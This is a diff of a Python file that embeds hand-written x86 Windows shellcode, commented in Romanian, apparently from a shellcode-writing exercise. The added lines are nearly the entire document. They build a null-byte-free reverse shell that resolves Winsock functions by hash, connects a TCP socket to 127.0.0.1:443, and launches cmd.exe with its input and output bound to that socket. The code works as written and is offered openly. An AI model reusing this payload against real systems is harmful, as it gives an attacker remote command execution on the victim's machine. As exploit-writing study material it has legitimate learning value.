@@ -16,7 +16,8 @@ CODE = """
 start:
     ; creem stiva
     mov ebp, esp
-    sub esp, 0x200
+    add esp, 0xfffff9f0 ; vom adaugam -1552 (adica scadem 1552
+                        ; pentru a evita NULL bytes)
 
     xor eax, eax        ;
     mov eax, fs:[0x30]  ;
@@ -62,25 +63,165 @@ found:
 
 ; rezolvam functii din kernel32.dll
 resolve_symbols_kernel32:
-     push 0x78b5b983             ; has ROT 13 - TerminateProcess
-     call search_function         ; apelam find_name_loop
-     mov [ebp+0x10], eax         ; salvam adresa TerminateProcess
+     push 0x78b5b983              ; has ROT 13 - TerminateProcess
+     call search_function         ; apelam search_function
+     mov [ebp+0x10], eax          ; salvam adresa TerminateProcess
 
-     push 0xec0e4e8e             ; has ROT 13 - LoadLibraryA
-     call search_function         ; Call find_name_loop
-     mov [ebp+0x14], eax         ; salvam adresa LoadLibraryA
+     push 0xec0e4e8e              ; has ROT 13 - LoadLibraryA
+     call search_function         ; Call search_function
+     mov [ebp+0x14], eax          ; salvam adresa LoadLibraryA
 
-     push 0x16b3fe72             ; has ROT 13 - CreateProcessA
-     call search_function         ; Call find_name_loop
-     mov [ebp+0x18], eax         ; salvam adresa CreateProcessA
+     push 0x16b3fe72              ; has ROT 13 - CreateProcessA
+     call search_function         ; Call search_function
+     mov [ebp+0x18], eax          ; salvam adresa CreateProcessA
 
+load_ws2_32:
+    xor eax, eax              ; facem EAX 0
+    mov ax, 0x6c6c            ; mutam sfarsitul string-ului in AX (evitam NULL-bytes)
+    push eax                  ; impingem registrul EAX in stiva
+    push 0x642e3233           ; impingem a doua jumatate din numele librariei
+    push 0x5f327377           ; impingem prima jumatate din numele librariei
+    push esp                  ; impingem adresa valorii ESP pentru a
+                              ; avea un pointer catre adresa sting-ului in stiva
+
+    call dword ptr [ebp+0x14] ; apelam LoadLibraryA
+
+resolve_symbols_ws2_32:
+    mov ebx, eax              ; mutam adresa ws2_32.dll in EBX
+
+    ; preluam adresa WSAStartup in EBP+0x1C
+    push 0x3bfcedcb           ; hash ROT13 WSAStartup
+    call search_function      ; apelam search_function
+    mov [ebp+0x1C], eax       ; salvam adresa WSAStartup
+
+    ; preluam adresa WSASocketA in EBP+0x20
+    push 0xadf509d9           ; hash ROT13 WSASocketA
+    call search_function      ; apelam search_function
+    mov [ebp+0x20], eax       ; salvam adresa WSASocketA
+
+    ; preluam adresa WSAConnect in EBP+0x24
+    push 0xb32dba0c           ; hash ROT13 WSAConnect
+    call search_function      ; apelam search_function
+    mov [ebp+0x24], eax       ; salvam adresa WSAConnect
+
+; apelam WSAStartup
+call_wsastartup:
+    mov eax, esp              ; mutam ESP in EAX
+
+    xor ecx, ecx              ; stergem ce valori reziduale erau in ECX
+    mov cx, 0x590             ; mutam 0x590 in CX
+    sub eax, ecx              ; scadem din valoarea ESP 0x590 a.i. sa nu dam
+                              ; overwrite structurii din greseaka
+    push eax                  ; impingem adresa la care se va salva WSAData
+    xor eax, eax              ; Null EAX
+    mov ax, 0x0202            ; mutam versiunea AX (primul parametru)
+    push eax                  ; punem pe stiva wVersionRequired (primul parametru)
+    call dword ptr [ebp+0x1C] ; apelam WSAStartup
+
+; apelam  WSASocketA
+call_wsasocketa:
+    xor eax, eax              ; facem EAX 0
+    push eax                  ; push dwFlags
+    push eax                  ; push g
+    push eax                  ; push lpProtocolInfo
+    mov al, 0x06              ; putem in AL IPPROTO_TCP
+    push eax                  ; push protocol
+    sub al, 0x05              ; scadem 0x05 din AL => AL = 0x01
+    push eax                  ; push type
+    inc eax                   ; incrementam EAX, EAX = 0x02
+    push eax                  ; push af
+    call dword ptr [ebp+0x20] ; apelam WSASocketA
+
+; apelam WSAConnect
+call_wsaconnect:
+    mov esi, eax              ; mutam descriptorul SOCKET in ESI (vezi WSASocketA)
+    xor eax, eax              ; facem EAX 0
+    push eax                  ; push sin_zero[]
+    push eax                  ; push sin_zero[]
+    push 0x0100007f           ; push sin_addr (127.0.0.1)
+    mov ax, 0xbb01            ; mutam sin_port (443) in AX
+    shl eax, 0x10             ; facem left shift EAX cu 0x10 bytes
+    add ax, 0x02              ; adaugam 0x02 (AF_INET) in AX
+    push eax                  ; push sin_port & sin_family
+    push esp                  ; push pointer in structura sockaddr_in
+    pop edi                   ; stocam pointer-ul sockaddr_in in EDI
+    xor eax, eax              ; facem EAX null
+    push eax                  ; push lpGQOS
+    push eax                  ; push lpSQOS
+    push eax                  ; push lpCalleeData
+    push eax                  ; push lpCalleeData
+    add al, 0x10              ; setam AL= 0x10
+    push eax                  ; push namelen
+    push edi                  ; push *name
+    push esi                  ; push s
+    call dword ptr [ebp+0x24] ; apelam WSAConnect
+
+; vom crea structura StartupInfoA si o vom salva in EDI
+create_startupinfoa:
+    push esi           ; push hStdError (HANDLE socket)
+    push esi           ; push hStdOutput (HANDLE socket)
+    push esi           ; push hStdInput (HANDLE socket)
+    xor eax, eax       ; facem EAX 0
+    push eax           ; push lpReserved2
+    push eax           ; push cbReserved2 & wShowWindow
+    mov al, 0x80       ; mutam 0x80 in AL
+    xor ecx, ecx       ; facem ECX 0
+    mov cx, 0x80       ; mutam 0x80 in CX
+    add eax, ecx       ; setam in EAX 0x100
+    push eax           ; push dwFlags
+    xor eax, eax       ; facem EAX 0
+    push eax           ; push dwFillAttribute
+    push eax           ; push dwYCountChars
+    push eax           ; push dwXCountChars
+    push eax           ; push dwYSize
+    push eax           ; push dwXSize
+    push eax           ; push dwY
+    push eax           ; push dwX
+    push eax           ; push lpTitle
+    push eax           ; push lpDesktop
+    push eax           ; push lpReserved
+    mov al, 0x44       ; mutam 0x44 in AL
+    push eax           ; push cb
+    push esp           ; push pointer-ului structurii STARTUPINFOA
+    pop edi            ; stocam pointerul catre STARTUPINFOA in EDI
+
+; vom crea string-ul `cmd.exe` si il vom salva in EBX
+create_cmd_string:
+    mov eax, 0xff9a879b ; mutam 0xff9a879b in EAX (valorea negativa a
+                        ; string-ului pentru a evita NULL chars)
+    neg eax             ; negam EAX, EAX = 00657865
+    push eax            ; push ultiuma parte din "cmd.exe"
+    push 0x2e646d63     ; push prima parte din "cmd.exe"
+    push esp            ; push pointer catre string "cmd.exe"
+    pop ebx             ; salvam string-ul in EBX
+
+; apelam CreateProcessA si setam STDIN si STDOUT pe socket-ul creat
+call_createprocessa:
+    mov eax, esp                ; mutam ESP in EAX
+    xor ecx, ecx                ; facem ECX 0
+    mov cx, 0x390               ; mutam 0x390 in CX
+    sub eax, ecx                ; scadem din EAX pentru a nu suprascrie structura mai tarziu
+    push eax                    ; push lpProcessInformation
+    push edi                    ; push lpStartupInfo
+    xor eax, eax                ; facem EAX 0
+    push eax                    ; push lpCurrentDirectory
+    push eax                    ; push lpEnvironment
+    push eax                    ; push dwCreationFlags
+    inc eax                     ; facem EAX 0x01 (TRUE)
+    push eax                    ; push bInheritHandles
+    dec eax                     ; facem EAX 0
+    push eax                    ; push lpThreadAttributes
+    push eax                    ; push lpProcessAttributes
+    push ebx                    ; push lpCommandLine
+    push eax                    ; push lpApplicationName
+    call dword ptr [ebp+0x18]   ; apelam CreateProcessA
 
 ; acum vom cauta functii in kernel32.dll
 search_function:
-    mov edx, [esp+4] ; preluam parametrul din stiva - parametrul este hash-ul functiei cautate
-    ; facem +4 pentru a sari peste return address-ul functiei
+    mov edx, [esp+4]             ; preluam parametrul din stiva - parametrul este hash-ul functiei cautate
+                                 ; facem +4 pentru a sari peste return address-ul functiei
 
-    pushad                        ; salvam toate registrele
+    pushad                       ; salvam toate registrele
 
     mov eax, [ebx + 0x3C]        ; offset catre PE Header
     mov edi, [ebx + eax + 0x78]  ; RVA Export Directory Table
@@ -145,7 +286,7 @@ found_name:
 
 end_find_name:
     popad                        ; restauram registrele, am gasit functia
-    mov eax, [esp+4]             ; restauram valoarea functiei cautate, stacata dupa adresa de return (parametrul functiei se pierde in proces)
+    mov eax, [esp+4]             ; restauram valoarea functiei cautate, stocata dupa adresa de return (parametrul functiei se pierde in proces)
     ret
 """
 
